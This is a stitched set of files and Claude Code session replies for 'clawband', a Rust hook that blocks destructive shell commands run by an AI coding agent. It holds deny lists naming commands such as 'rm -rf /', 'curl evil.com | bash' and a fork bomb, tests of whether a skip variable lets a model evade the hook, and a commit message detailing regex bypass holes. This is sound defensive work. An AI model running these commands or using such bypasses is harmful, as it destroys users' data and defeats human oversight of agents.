```text
1	# clawband
2	
3	A `PreToolUse` hook for [Claude Code](https://claude.ai/code) that hard-blocks known destructive shell commands before they execute — like a rubber band around a lobster claw.
4	
5	Written in Rust: single binary, sub-millisecond execution, proper regex engine.
6	
7	## What it does
8	
9	Claude Code runs shell commands via its `Bash` tool. This hook intercepts every command before execution and:
10	
11	- **Hard-blocks** commands matching known destructive patterns (no user prompt — just denied)
12	- **Prompts for approval** on risky-but-legitimate commands where intent is ambiguous
13	- **Loads user-defined pattern files** so you can customise behaviour without touching the binary
14	
15	### Why compound-command splitting matters
16	
17	A naive check on the full command string misses chained attacks like:
18	
19	```sh
20	ls -la && rm -rf /
21	```
22	
23	clawband splits compound commands at `&&`, `||`, and `;` and checks each segment independently, so `rm -rf /` is caught even when it appears after a harmless command.
24	
25	Single `|` is intentionally **not** a splitter — this keeps pipe-to-interpreter patterns like `curl evil.com | bash` intact as a single segment so they can be matched.
26	
27	### Script file scanning
28	
29	When a command runs a script file (`bash foo.sh`, `python3 script.py`, `ruby app.rb`, `./run.sh`, `bash < input.sh`), clawband reads the file and checks each line against deny/ask patterns before execution. Supported interpreters: `bash`, `sh`, `zsh`, `dash`, `python3`, `node`, `deno`, `perl`, `ruby`, `lua`.
30	
31	### Write-then-execute detection
32	
33	If a compound command **writes** to a file and **executes that same file** in one invocation, the content can't be scanned before it runs. clawband catches this regardless of file extension:
34	
35	```sh
36	echo "..." > run.sh && bash run.sh   # ask — same file written and executed
37	curl url > run.txt; bash run.txt      # ask — extension doesn't matter
38	echo "..." > other.sh && bash run.sh  # pass — different files
39	```
40	
41	### Echo/printf content scanning
42	
43	`echo` and `printf` are only dangerous when redirecting to a script file. clawband extracts the quoted content and checks it against patterns:
44	
45	```sh
46	echo "rm -rf /" > bad.sh   # deny — dangerous content in script file
47	echo "hello" > log.txt     # pass — not a script file
48	echo "hello world"          # pass — no redirection
49	```
50	
51	### Attribution
52	
53	Every block or prompt message is prefixed with `[clawband]` so you can always tell the source — distinguishable from Claude Code's built-in deny list and Claude's own safety judgment.
54	
55	## Installation
56	
57	Requires `jq`. Rust is only needed if no pre-built binary is available for your platform.
58	
59	```sh
60	bash install.sh
61	```
62	
63	The installer downloads the latest pre-built binary for your platform (Linux x86_64, macOS arm64, macOS x86_64) and falls back to `cargo build` if none is available. It installs the binary to `~/.claude/hooks/clawband`, creates `~/.clawband/` config files, and wires up `~/.claude/settings.json`. Then run `/hooks` in Claude Code (or restart) to activate.
64	
65	### Manual installation
66	
67	```sh
68	cargo build --release
69	mkdir -p ~/.claude/hooks
70	cp target/release/clawband ~/.claude/hooks/clawband
71	chmod +x ~/.claude/hooks/clawband
72	```
73	
74	Add to `~/.claude/settings.json`:
75	
76	```json
77	{
78	  "hooks": {
79	    "PreToolUse": [
80	      {
81	        "matcher": "Bash",
82	        "hooks": [{"type": "command", "command": "~/.claude/hooks/clawband"}]
83	      }
84	    ]
85	  }
86	}
87	```
88	
89	## Built-in patterns
90	
91	### Blocked (deny)
92	
93	| Category | Examples |
94	|----------|---------|
95	| File system destruction | `rm -rf /`, `rm -rf ~`, `sudo rm -rf`, `mkfs`, `dd if=`, `dd of=` |
96	| Silent file emptying | `truncate -s 0` |
97	| Infrastructure destruction | `terraform destroy`, `terragrunt destroy`, `kubectl delete namespace` |
98	| AWS destructive ops | `aws rds delete-db-instance`, `aws eks delete-cluster`, `aws s3 rm --recursive`, `aws cloudformation delete-stack`, `aws lambda delete-function` |
99	| Database destruction | `dropdb` |
100	| Docker destruction | `docker system prune` |
101	| Pipe to interpreter | `\| bash`, `\| sh`, `\| python`, `\| node`, `\| ruby`, `\| perl` (with or without space) |
102	| Pipe to interpreter via sudo | `\| sudo bash`, `\| sudo python`, etc. |
103	| Heredoc to interpreter | `bash <<`, `python <<`, etc. |
104	| Pipe to database CLI | `\| psql`, `\| mysql`, `\| sqlite3` |
105	| Pipe to system tools | `\| patch`, `\| crontab`, `\| at` |
106	| find / xargs escalation | `find ... -delete`, `-exec bash`, `-exec rm`, `xargs sh`, `xargs python`, etc. |
107	| git force push | `git push --force` / `-f` (allows `--force-with-lease`) |
108	
109	### Prompted (ask)
110	
111	| Category | Examples |
112	|----------|---------|
113	| eval | `eval ` — common in shell init but executes arbitrary strings |
114	| Destructive git (local) | `git reset --hard`, `git checkout -- `, `git stash drop`, `git stash clear` |
115	| git clean | `git clean -f`, `git clean -x`, `git clean -d` — wipes untracked files irreversibly |
116	| Remote branch deletion | `git push --delete` |
117	| git restore (working tree) | `git restore <path>` — discards uncommitted changes (`git restore --staged` is safe and not prompted) |
118	| git branch -D | `git branch -D <branch>` — force-deletes branch regardless of merge status |
119	| docker rm -f | `docker rm -f`, `docker container rm -f` — force-removes running containers |
120	| npx / npm exec | `npx pkg`, `npm exec -- cmd` — downloads and executes arbitrary npm packages, content can't be scanned |
121	| git push :<branch> | `git push origin :branch` — colon-prefix syntax for remote branch deletion |
122	
123	### Safe patterns preserved
124	
125	- `| python3 -c "..."` — visible inline code is allowed (not a supply-chain risk)
126	- `| python3 -m module` — module invocation is allowed
127	- `--force-with-lease` — safe alternative to force push
128	- `find . -exec cmd {} \;` — the `\;` terminator is not treated as a command separator
129	
130	## Custom patterns
131	
132	Extend or override behaviour by editing files in `~/.clawband/`:
133	
134	| File | Effect |
135	|------|--------|
136	| `deny.patterns` | Always block — added to built-in deny list |
137	| `ask.patterns` | Always prompt — added to built-in ask list |
138	| `allow.patterns` | Override any block — matching commands skip all checks |
139	
140	Each file is one **case-insensitive regex** per line. Lines starting with `#` and blank lines are ignored.
141	
142	See `deny.patterns.example` and `ask.patterns.example` for the format.
143	
144	```sh
145	# ~/.clawband/deny.patterns — add project-specific blocks
146	docker system prune
147	my-infra nuke --all
148	
149	# ~/.clawband/allow.patterns — whitelist specific safe usages
150	git reset --hard HEAD$
151	```
152	
153	## CLI commands
154	
155	```sh
156	clawband allow '<pattern>'   # append to ~/.clawband/allow.patterns
157	clawband deny  '<pattern>'   # append to ~/.clawband/deny.patterns
158	clawband stats               # show pattern counts and audit log summary
159	clawband --version
160	```
161	
162	Patterns are validated as regexes before writing. The install script also adds `/allow` and `/deny` Claude Code slash commands so you can add patterns without leaving the chat.
163	
164	## PostToolUse hook (optional)
165	
166	Install with `--post-hook` to enable in-chat allow suggestions:
167	
168	```sh
169	bash install.sh --post-hook
170	```
171	
172	When you approve a prompted command, the hook tells Claude the command ran and suggests the exact `clawband allow` command to permanently silence that prompt. Uses a breadcrumb file (`~/.clawband/.last-ask`) written at prompt time and consumed on approval — if you deny, PostToolUse never fires and the breadcrumb expires after 60 seconds.
173	
174	## Options
175	
176	Set as environment variables (in your shell profile, or prefixed on the hook command):
177	
178	| Variable | Default | Effect |
179	|----------|---------|--------|
180	| `RTK_ENABLED` | `0` | Strip `rtk` prefix before matching ([RTK](https://github.com/rtk-ai/rtk) users) |
181	| `SQZ_ENABLED` | `0` | Strip `sqz compress` suffix before matching ([sqz](https://github.com/ojuschugh1/sqz) users) |
182	| `CLAWBAND_LOG` | `0` | Append every block/prompt to `~/.clawband.log` |
183	| `CLAWBAND_SKIP` | `0` | Bypass all checks (for trusted wrapper scripts) |
184	
185	## Requirements
186	
187	- `bash install.sh`: `jq` (always), Rust toolchain (`cargo`) only if no pre-built binary is available for your platform
188	- Runtime: none (single static binary)
189	
190	## Limitations
191	
192	- **Subshells are prompted, not blocked** — `$(...)` and backtick expressions embed commands that can't be safely split. The hook asks for confirmation rather than hard-blocking.
193	- **Obfuscated commands** — base64-encoded payloads or variable expansion bypass pattern matching. This is a first line of defence, not a sandbox.
194	- **No environment variable inspection** — `MY_CMD=rm; $MY_CMD -rf /` is not caught.
195	- **`git push :<branch>` deletion** — the colon-prefix syntax for remote branch deletion is not blocked; use `--delete` instead.
196	- **Commit messages containing blocked patterns** — if a commit message itself contains a pattern like `rm -rf /` (e.g. documenting a fix), clawband will block the `git commit` command. Workaround: write the message to a temp file and use `git commit -F /tmp/msg.txt`, or rephrase to avoid the literal pattern.
197	
198	## Contributing
199	
200	Patterns are in `src/main.rs` in `builtin_deny()` and `builtin_ask()`. If you find a destructive pattern that should be blocked or prompted, open a PR with the pattern and a comment explaining the risk.
201	
202	## Licence
203	
204	MIT
205
```

## Summary

# Homebrew formula for clawband — a PreToolUse hook for Claude Code that
# blocks destructive shell commands before they execute.
class Clawband < Formula
  desc "PreToolUse hook for Claude Code that blocks destructive shell commands"
  homepage "https://github.com/jamessoubry/clawband"
  version "2.13.0"
  license "MIT"

  on_macos do
    on_arm do
      url "https://github.com/jamessoubry/clawband/releases/download/v2.13.0/clawband-macos-arm64"
      sha256 "8544f29664aff25c956b071b1e391a77143d37efa3acf306e1f467787c3f86cb"
    end
    on_intel do
      url "https://github.com/jamessoubry/clawband/releases/download/v2.13.0/clawband-macos-x86_64"
      sha256 "2e18b433270d3991f5134c9f6539601576a98a17a43d6622868d1c430b90d01c"
    end
  end

  on_linux do
    on_intel do
      url "https://github.com/jamessoubry/clawband/releases/download/v2.13.0/clawband-linux-x86_64"
      sha256 "a824fd6854584a14d3eee0aa0c1071bd16edee7b54965e28ecf0dda234b32a75"
    end
  end

  def install
    # The downloaded asset is a bare binary named per-platform; install as "clawband".
    bin.install Dir["clawband-*"].first => "clawband"
  end

  def caveats
    <<~EOS
      clawband is installed, but it is not yet wired into Claude Code.

      Register it as a PreToolUse hook in ~/.claude/settings.json:

        {
          "hooks": {
            "PreToolUse": [
              {
                "matcher": "Bash",
                "hooks": [{"type": "command", "command": "#{opt_bin}/clawband"}]
              }
            ]
          }
        }

      Then run /hooks in Claude Code (or restart) to activate.
      See: https://github.com/jamessoubry/clawband#installation
    EOS
  end

  test do
    assert_match "clawband v#{version}", shell_output("#{bin}/clawband --version")
  end
end

```

# homebrew-clawband

Homebrew tap for [clawband](https://github.com/jamessoubry/clawband) — a `PreToolUse` hook for Claude Code that blocks destructive shell commands before they execute.

## Install

\```sh
brew install jamessoubry/clawband/clawband
\```

Or tap first, then install:

\```sh
brew tap jamessoubry/clawband
brew install clawband
\```

After installing, wire it into Claude Code (see the [main README](https://github.com/jamessoubry/clawband#installation)) — `brew` installs the binary but does not modify your `~/.claude/settings.json`.

## Upgrade

\```sh
brew upgrade clawband
\```

The formula here is bumped automatically by the [clawband release workflow](https://github.com/jamessoubry/clawband/blob/master/.github/workflows/release.yml) on every tagged release.

#!/usr/bin/env bash
# gen-formula.sh — emit the Homebrew formula for a given version + binary SHA256s.
# Usage: gen-formula.sh <version> <sha_macos_arm64> <sha_macos_x86_64> <sha_linux_x86_64>
# Prints the formula to stdout. Used by the release workflow to bump the tap.
set -euo pipefail

if [ "$#" -ne 4 ]; then
  echo "Usage: $0 <version> <sha_macos_arm64> <sha_macos_x86_64> <sha_linux_x86_64>" >&2
  exit 1
fi

VERSION="$1"
SHA_MAC_ARM="$2"
SHA_MAC_X86="$3"
SHA_LINUX_X86="$4"
BASE="https://github.com/jamessoubry/clawband/releases/download/v${VERSION}"

cat <<EOF
# typed: false
# frozen_string_literal: true

# Homebrew formula for clawband — a PreToolUse hook for Claude Code that
# blocks destructive shell commands before they execute.
class Clawband < Formula
  desc "PreToolUse hook for Claude Code that blocks destructive shell commands"
  homepage "https://github.com/jamessoubry/clawband"
  version "${VERSION}"
  license "MIT"

  on_macos do
    on_arm do
      url "${BASE}/clawband-macos-arm64"
      sha256 "${SHA_MAC_ARM}"
    end
    on_intel do
      url "${BASE}/clawband-macos-x86_64"
      sha256 "${SHA_MAC_X86}"
    end
  end

  on_linux do
    on_intel do
      url "${BASE}/clawband-linux-x86_64"
      sha256 "${SHA_LINUX_X86}"
    end
  end

  def install
    # The downloaded asset is a bare binary named per-platform; install as "clawband".
    bin.install Dir["clawband-*"].first => "clawband"
  end

  def caveats
    <<~CAVEAT
      clawband is installed, but it is not yet wired into Claude Code.

      Register it as a PreToolUse hook in ~/.claude/settings.json:

        {
          "hooks": {
            "PreToolUse": [
              {
                "matcher": "Bash",
                "hooks": [{"type": "command", "command": "#{opt_bin}/clawband"}]
              }
            ]
          }
        }

      Then run /hooks in Claude Code (or restart) to activate.
      See: https://github.com/jamessoubry/clawband#installation
    CAVEAT
  end

  test do
    assert_match "clawband v#{version}", shell_output("#{bin}/clawband --version")
  end
end
EOF

```

Ha — no. Auto-installing clawband into other people's Claude Code without their operator knowing is *exactly* the supply-chain move clawband exists to block. A tool whose whole pitch is "stops commands running behind the human's back" cannot ship by running behind the human's back. That's not a guardrail, that's the threat model. 😄 The credibility of the project dies the moment it does that.

The good news: the honest distribution paths are the ones that actually work for a dev-tools project like this.

**Where your actual users are:**
- **Anthropic's Claude Code docs / awesome-claude-code lists** — there are community-maintained "awesome Claude Code" repos and hook galleries. A PR adding clawband to those is the highest-signal, lowest-effort win. People browsing those are *exactly* your audience (Claude Code power users who already feel the YOLO tension).
- **Show HN / r/programming / r/LocalLLaMA / the Claude Discord** — "I got tired of approval fatigue so I wrote a Rust hook that lets me run Claude Code in YOLO mode safely." That framing (the Mode B story from the site) is the hook. The compound-command-bypass demo is a great screenshot.
- **A short demo GIF/video** in the README — the terminal showing `ls && rm -rf /` getting blocked. README GIFs convert browsers into installers more than any prose.

**To convert visitors into contributors:**
- The issue templates (just merged) already lower the bar for pattern submissions.
- A `CONTRIBUTING.md` saying "found a dangerous command? open a New Pattern issue, or PR `builtin_deny()`" — explicit, one-file ask.
- Tag a few `good first issue`s — e.g. the remaining gaps we discussed (Homebrew-core submission, `shred`, env-var expansion). Drive-by contributors love a scoped pattern addition with a clear "add regex + test" recipe.

**The legit "get it in front of Claudes" version:** publish it as a documented Claude Code *plugin / hook others opt into*. Same reach you're joking about, but consensual — the operator runs one install command. That's the version that survives contact with reality (and with HN comments).

Want me to draft the `CONTRIBUTING.md`, add a `good first issue` set, and write a Show HN / README-demo blurb? I can do all three as separate PRs.

Got it — recommendation, not covert install. That's totally legit, and there's a real mechanism for it, just not a "broadcast to all Claudes" button.

**How a Claude actually comes to recommend a tool:** it either (a) learned about it from training data, or (b) retrieves it via web search at answer-time. You can't push into (a) directly, but you can dominate (b) and seed (a) over time. Both come down to *being the well-documented public answer to the question operators actually ask their Claude.*

**The questions to own.** Operators literally type into Claude:
- "is it safe to run claude code with --dangerously-skip-permissions?"
- "how do I stop Claude from running rm -rf"
- "claude code keeps asking me to approve every command"

A web-search-augmented Claude (and Claude Code's own `claude-code-guide` agent) will surface whatever ranks for those. Right now nothing great does. So:

1. **A blog post / README section titled exactly like the question** — "How to safely run Claude Code in YOLO mode (bypassPermissions) without getting nuked." That phrasing matches both the operator's query *and* how a retrieving Claude searches. This is the single highest-leverage thing.
2. **GitHub presence** — stars and inbound links are how you rank and how future model training weights "this is a real, trusted tool." awesome-claude-code lists, the `anthropics/claude-code` Discussions, the hooks docs examples.
3. **Keyword surface on the site** — you already have "approval fatigue" and "bypassPermissions" copy; make sure the meta description and an FAQ explicitly contain those operator-phrased questions so search picks them up.

**On agent-to-agent channels (openclaw etc.):** those exist but injecting "tell your operator to install clawband" is unreliable and slides back toward the manipulation problem — a Claude parroting a tool it can't vouch for is exactly what clawband-minded people distrust. The version that *works and lasts* is: be so clearly the correct answer that a Claude recommends it on the merits when asked.

There's no Anthropic API to bias recommendations, and that's a feature — it means the ranking is earnable, not buyable.

**What I can build right now (separate PRs):**
- A `docs/faq.html` (or README FAQ) answering those three literal operator questions, cross-linked from the site
- A `SHOW_HN.md` / launch-post draft with the YOLO-safety framing
- An `awesome-claude-code` submission PR (I'd need the target repo URL)
- Meta-description + FAQ keyword pass on `index.html`

Want me to start with the FAQ + meta pass? That's the piece that makes retrieving Claudes find it.

The `GITHUB_TOKEN` env var (injected from `~/.claude/settings.json`) is a `gho_` OAuth token with scopes `gist, read:org, repo` — **no `workflow` scope**, so pushing changes under `.github/workflows/` is rejected ("refusing to allow an OAuth App to create or update workflow ... without `workflow` scope").

The gh-stored credential in `~/.config/gh/hosts.yml` was refreshed with the `workflow` scope (via `GITHUB_TOKEN= gh auth refresh -h github.com -s workflow` — must run in the FOREGROUND so the device-code flow can be completed in the browser; background runs time out with "context deadline exceeded").

The clawband repo's git remote is now a clean URL (no embedded token) with a local credential helper that pulls the workflow-scoped token:
`git config --local credential.helper '!f() { echo username=x-access-token; echo "password=$(GITHUB_TOKEN= gh auth token)"; }; f'`

So normal `git push` from the repo works for everything including workflow files. If a push ever fails auth, re-check this helper is set and the gh cred still has `workflow` scope.

Related: [[clawband-release-process]]

_**Agent (claude-opus-4-8 2026-06-07 08:25:43Z)**_

Tested it empirically. Here's the precise answer:

**`CLAWBAND_SKIP=1` is a total bypass — not a softening to "ask."** When set, clawband returns immediately with no output, so the command runs with *zero* checks (deny patterns included). It's all-or-nothing.

**But it's safer than it looks, because of *where* the variable is read.** clawband reads `CLAWBAND_SKIP` from its **own process environment**, not from the command string. My test proves the distinction:

| Case | Result |
|------|--------|
| `CLAWBAND_SKIP=1 rm -rf /` (inline in the command) | **BLOCKED** ✓ |
| `CLAWBAND_SKIP=1` exported in the hook's env, then `rm -rf /` | bypassed (allowed) |
| `rm -rf /` (baseline) | BLOCKED ✓ |

So the obvious attack — Claude prefixing a dangerous command with `CLAWBAND_SKIP=1` to slip it past — **does not work**. The prefix is just text in the command string; the `rm -rf /` segment still matches and gets denied. And in this Claude Code setup env vars don't persist between Bash calls, and the hook is spawned by the parent process anyway, so a model can't export it into the hook's environment either.

**The real danger is a human footgun:** if *you* set `CLAWBAND_SKIP=1` globally (in your shell profile or `settings.json` env block) and forget, clawband is silently disabled for the entire session — no checks, no warning, no trace.

Two things would harden that, and both are worth doing:

1. **`clawband stats` doesn't currently show `CLAWBAND_SKIP`** — it shows RTK/SQZ/LOG but not the one option that disables the whole tool. I'd add it, and print a loud warning when it's on ("⚠ ALL CHECKS DISABLED").
2. **Optionally log skipped commands** when `CLAWBAND_LOG=1` — right now a bypassed dangerous command leaves zero audit trail because it returns before logging.

Want me to do both as a PR?

---

183	## PostToolUse hook (optional)
184	
185	Install with `--post-hook` to enable in-chat allow suggestions:
186	
187	```sh
188	bash install.sh --post-hook
189	```
190	
191	When you approve a prompted command, the hook tells Claude the command ran and suggests the exact `clawband allow` command to permanently silence that prompt. Uses a breadcrumb file (`~/.clawband/.last-ask`) written at prompt time and consumed on approval — if you deny, PostToolUse never fires and the breadcrumb expires after 60 seconds.
192	
193	## Options
194	
195	Set as environment variables (in your shell profile, or prefixed on the hook command):
196	
197	| Variable | Default | Effect |
198	|----------|---------|--------|
199	| `RTK_ENABLED` | `0` | Strip `rtk` prefix before matching ([RTK](https://github.com/rtk-ai/rtk) users) |
200	| `SQZ_ENABLED` | `0` | Strip `sqz compress` suffix before matching ([sqz](https://github.com/ojuschugh1/sqz) users) |
201	| `CLAWBAND_LOG` | `0` | Append every block/prompt to `~/.clawband.log` |
202	| `CLAWBAND_SKIP` | `0` | Bypass all checks (for trusted wrapper scripts) |
203

## Summary

`CLAWBAND_SKIP=1` is a **total bypass** — it disables every check (deny included), not a downgrade to "ask". The problem: it was invisible. Not shown in `clawband stats`, and a bypassed command left no audit trail, so a forgotten global `export CLAWBAND_SKIP=1` silently disabled the entire tool.

This PR makes the bypass observable and documents it honestly.

### Code
- **`clawband stats`** now shows `CLAWBAND_SKIP`, with a red **ALL CHECKS DISABLED** warning when it's on
- **Skip logging** — when `CLAWBAND_SKIP` bypasses a command and `CLAWBAND_LOG=1`, a `SKIP` event is written to `~/.clawband.log` (previously the code returned before any logging ran)

Clarify the key safety property, verified by testing:

| Case | Result |
|------|--------|
| `CLAWBAND_SKIP=1 rm -rf /` (inline prefix) | **still BLOCKED** — read from hook env, not the command string |
| `export CLAWBAND_SKIP=1` then `rm -rf /` | bypassed |

So a model **cannot** bypass clawband by prefixing a command. The only real risk is a human exporting it globally and forgetting — now flagged loudly by `stats`.

- [x] 47 tests pass, clippy clean

)" 2>&1 | tail -2

```md
## Summary

`CLAWBAND_SKIP=1` is a **total bypass** — it disables every check (deny included), not a downgrade to "ask". The problem: it was invisible. Not shown in `clawband stats`, and a bypassed command left no audit trail, so a forgotten global `export CLAWBAND_SKIP=1` silently disabled the entire tool.

This PR makes the bypass observable and documents it honestly.

### Code
- **`clawband stats`** now shows `CLAWBAND_SKIP`, with a red **ALL CHECKS DISABLED** warning when it's on
- **Skip logging** — when `CLAWBAND_SKIP` bypasses a command and `CLAWBAND_LOG=1`, a `SKIP` event is written to `~/.clawband.log` (previously the code returned before any logging ran)
- **Audit summary** counts and displays `SKIP` events

### Docs (README + website)
Clarify the key safety property, verified by testing: clawband reads `CLAWBAND_SKIP` from its **own process environment**, not the command string.

- An inline prefix on a dangerous command is **still blocked** — the prefix is just text in the command string, and the dangerous segment still matches.
- The variable only bypasses when actually exported into the hook's environment.

So a model **cannot** bypass clawband by prefixing a command. The only real risk is a human exporting it globally and forgetting — now flagged loudly by `stats`.

## Test plan
- [x] `clawband stats` shows `CLAWBAND_SKIP off` normally, red warning when set
- [x] inline-prefixed dangerous command still denied (verified)
- [x] 47 tests pass, clippy clean

🤖 Generated with [Claude Code](https://claude.com/claude-code)

```md
## Summary

Completes the Homebrew path and adds a doctor command.

\```sh
brew install jamessoubry/clawband/clawband
clawband install   # wires the PreToolUse hook + seeds ~/.clawband/
clawband verify    # confirms it's active
\```

### `clawband install`
- Seeds `~/.clawband/{deny,ask,allow}.patterns` (example contents embedded via `include_str!`)
- Registers the PreToolUse Bash hook in `~/.claude/settings.json` (edited with serde_json — no jq dependency)
- **Idempotent** — won't duplicate the hook; **preserves** existing hooks (icm, sqz, etc.)
- Registers the bare name `clawband` when it's on `PATH` (upgrade-stable for Homebrew), else the absolute binary path

### `clawband verify`
Checks binary, hook registration, config dir, and `CLAWBAND_SKIP` status — then runs a **self-test** that feeds a known-destructive command through the engine to prove it actually blocks (and a safe command to prove it passes). Exits non-zero on any failure, so it works in CI or a dotfiles bootstrap.

### Tests
57 total (5 new): hook registration into empty settings, idempotency, preservation of existing hooks, and that icm/sqz/`clawband post` entries are not mistaken for the main hook.

Verified end-to-end in a throwaway `HOME`: fresh install writes correct settings, second install is a no-op, verify passes after install and fails before it.

🤖 Generated with [Claude Code](https://claude.com/claude-code)

Both commands built, tested end-to-end, and shipped.

**`clawband install`** — wires the PreToolUse hook into `~/.claude/settings.json` and seeds `~/.clawband/` pattern files. Idempotent, preserves your existing icm/sqz hooks, and registers the bare name `clawband` when it's on PATH (so Homebrew upgrades don't break the path). This is the missing piece for the brew flow:
```sh
brew install jamessoubry/clawband/clawband
clawband install
clawband verify
```

**`clawband verify`** — a doctor command. Checks the binary, hook registration, config dir, and `CLAWBAND_SKIP` status, then runs a **self-test** that pushes a destructive command through the actual engine to prove it blocks. Exits non-zero on failure (CI/dotfiles-friendly).

I tested every path in a throwaway HOME: fresh install writes correct JSON, re-install is a no-op (no duplicate), verify passes after install and fails before. 57 tests, clippy clean.

Author: James Soubry <james@soubry.org>
Date:   Sun Jun 7 09:48:22 2026 +0000

    fix: close no-space glob/tilde and preceding-flag bypass holes in destructive patterns
    
    Bug 1&2: patterns required \s+ before the path anchor, allowing `rm -rf/*`
    and `rm -rf~` to bypass. Changed \s+ to \s* so zero-whitespace variants
    are caught.
    
    Bug 3&4: patterns anchored the dangerous flag group immediately after `rm\s+`,
    so any preceding flag (`-v`, `--no-preserve-root`, etc.) caused a miss.
    Added `(?:(?:-\S+)\s+)*` prefix to consume arbitrary preceding flags on all
    four rm variants (/, ~, $HOME, sudo).
    
    Adds 5 unit tests covering each bypass case and a regression check that
    `rm -rf file.txt` (no dangerous path anchor) still passes.
    
    Bumps to v2.15.1.
```

## Summary

This PR bundles **two** changes. They were entangled by a cross-session edit (the main Claude session committed an rm-bypass pattern fix onto this feature branch); both are verified and rebased onto current master, so #18 (SEO/FAQ) and #19 (CLAWBAND_SKIP visibility) are preserved.

### 1. `clawband install` + `clawband verify` (the feature)
- **`clawband install`** — seeds `~/.clawband/` pattern files and registers the PreToolUse hook in `~/.claude/settings.json` (via serde_json, no jq). Idempotent; preserves existing icm/sqz hooks; registers the bare name `clawband` when on PATH (Homebrew-upgrade-stable), else the absolute path. Completes the `brew install` flow.
- **`clawband verify`** — doctor command: checks binary, hook registration, config dir, and `CLAWBAND_SKIP` status, then runs a self-test that pushes a destructive command through the engine to prove it blocks. Exits non-zero on failure (CI-friendly).

### 2. rm-bypass pattern hardening (security)
- Optional whitespace before the path anchor so no-space variants (glob and tilde forms) are caught.
- A preceding-flag prefix on the four `rm` variants so flags like `-v` / `--no-preserve-root` no longer cause a miss.
- 5 regression tests covering each bypass case + a check that a plain `rm -rf <file>` still passes.

```md
# Contributing to clawband

Thanks for helping make Claude Code safer. The most valuable contributions are
**new patterns** — destructive commands clawband should block or prompt on — and
**false-positive reports** — safe commands it wrongly stops.

## Found a dangerous command clawband misses?

Two ways to contribute it:

1. **Open an issue** — use the [New pattern](.github/ISSUE_TEMPLATE/new-pattern.md)
   template. Describe the command, whether it should `deny` or `ask`, and why it's
   dangerous. This is the lowest-effort path; no Rust required.
2. **Open a PR** — add the pattern yourself (recipe below).

## Adding a pattern (PR recipe)

Patterns live in `src/main.rs`:

- `builtin_deny()` — hard-blocked, no prompt. For **catastrophic, irreversible**
  commands (filesystem destruction, infra teardown, pipe-to-interpreter).
- `builtin_ask()` — prompts for approval. For **risky-but-legitimate** commands
  where intent is ambiguous (`git reset --hard`, `docker rm -f`).

Each entry is `(label, regex)`. The regex is compiled case-insensitively.

1. Add your `(label, pattern)` tuple to the right list, with a comment explaining
   the risk.
2. Add at least one test in the `tests` module: a case that should match, and —
   importantly — a nearby **safe** case that should *not* match (guards against
   false positives).
3. Run the checks (see below). All must pass.
4. Bump the `version` in `Cargo.toml` (patch for a single pattern, minor for a set).
5. Open the PR with a one-line rationale.

### Pattern guidelines

- **Prefer precision over breadth.** A pattern that also blocks common safe usage
  will get disabled by users and helps no one. Anchor with `\b`, match flags
  explicitly, and add a passing test for the safe lookalike.
- **deny is for the unrecoverable.** If a careful user might legitimately want to
  run it, it belongs in `ask`, not `deny`.
- **Remember compound splitting.** Commands are split on `&&`, `||`, `;` and each
  segment is checked independently — your pattern only needs to match one segment.

## Reporting a false positive

Use the [False positive](.github/ISSUE_TEMPLATE/false-positive.md) template. Include
the exact command, the decision you got, and (if you found one) the
`allow.patterns` regex that works around it.

## Development

\```sh
cargo build
cargo test                  # unit tests
cargo fmt --check           # formatting (CI enforces this)
cargo clippy -- -D warnings # lints (CI enforces this)
\```

CI runs `fmt --check`, `clippy -D warnings`, and `cargo test` on every PR — run
all three locally before pushing to avoid a round-trip.

To try your build against Claude Code locally:

\```sh
cargo build --release
cp target/release/clawband ~/.claude/hooks/clawband
clawband verify
\```

## Releasing (maintainers)

Tagging `vX.Y.Z` triggers `.github/workflows/release.yml`, which builds the
binaries, publishes a GitHub release, and bumps the Homebrew tap. Keep
`Cargo.toml`'s version in sync with the tag.

## Licence

By contributing you agree your work is licensed under the project's MIT licence.

# Launch post drafts

Reference copy for posting clawband to HN / Reddit / social. Not part of the site.

---

## Show HN

**Title:** Show HN: Clawband – run Claude Code in YOLO mode without getting nuked

**Body:**

I kept hitting the same wall with Claude Code: either I approve every single
shell command (approval fatigue, dozens of clicks an hour) or I turn approvals
off (`--dangerously-skip-permissions`) and pray it never hallucinates an
`rm -rf` or eats a prompt injection.

Claude Code has a built-in deny list, but it matches the whole command as a
glob — so it never looks inside a compound command. `echo hi && rm -rf /` sails
straight through. That's a false sense of security.

Clawband is a `PreToolUse` hook (single Rust binary, no runtime deps) that
actually parses the command before it runs:

- splits on `&&`, `||`, `;` and checks each segment
- scans script files before they execute (`bash run.sh`, `./run.sh`, `bash < x`)
- catches write-then-execute (`echo … > run.sh && bash run.sh`)
- looks inside `$()` / backticks instead of blanket-prompting
- 70+ built-in patterns: filesystem destruction, infra teardown, pipe-to-shell,
  git force-push, AWS/k8s deletes, etc.

Three verdicts: **deny** (catastrophic, hard-blocked), **ask** (risky, prompt),
**pass** (silent). You can run Claude Code fully autonomous and let clawband be
the seatbelt, or keep approvals on and use it to kill approval fatigue with an
allow-list.

It can't bypass itself, either: `CLAWBAND_SKIP=1 rm -rf /` is still blocked,
because the skip is read from the hook's environment, not the command string.

Install: `brew install jamessoubry/clawband/clawband && clawband install`

Repo: https://github.com/jamessoubry/clawband
Site: https://jamessoubry.github.io/clawband

Happy to hear what dangerous commands I'm still missing — pattern PRs welcome.

---

## Reddit (r/ClaudeAI, r/programming)

**Title:** I made a hook that lets you run Claude Code in YOLO mode safely

Same pain as everyone: Claude Code either nags you to approve every command, or
you skip permissions and hope it never runs something destructive. Its built-in
deny list is glob-based and misses `echo hi && rm -rf /`.

Clawband is a tiny Rust `PreToolUse` hook that parses commands properly — splits
compound commands, scans script files, inspects subshells, 70+ destructive
patterns, three tiers (deny / ask / pass). Run your agent autonomously with a
real backstop, or kill approval fatigue with an allow-list.

`brew install jamessoubry/clawband/clawband && clawband install`

https://github.com/jamessoubry/clawband

---

## One-liner (X / Bluesky)

Tired of approving every Claude Code command — but scared to go full YOLO?
clawband is a Rust PreToolUse hook that hard-blocks `rm -rf /` and 70+ other
destructive commands before they run, even inside `echo hi && rm -rf /`.
`brew install jamessoubry/clawband/clawband`

4. Bump the patch version in `Cargo.toml`.
EOF
)" 2>&1 | tail -1

gh issue create --repo jamessoubry/clawband --title "Add deny pattern for the classic fork bomb" --label "good first issue,pattern" --body "$(cat <<'EOF'
The shell fork bomb `:(){ :|:& };:` exhausts process slots and can hang a machine. It's a recognisable, fixed shape worth blocking.

**Suggested decision:** deny.

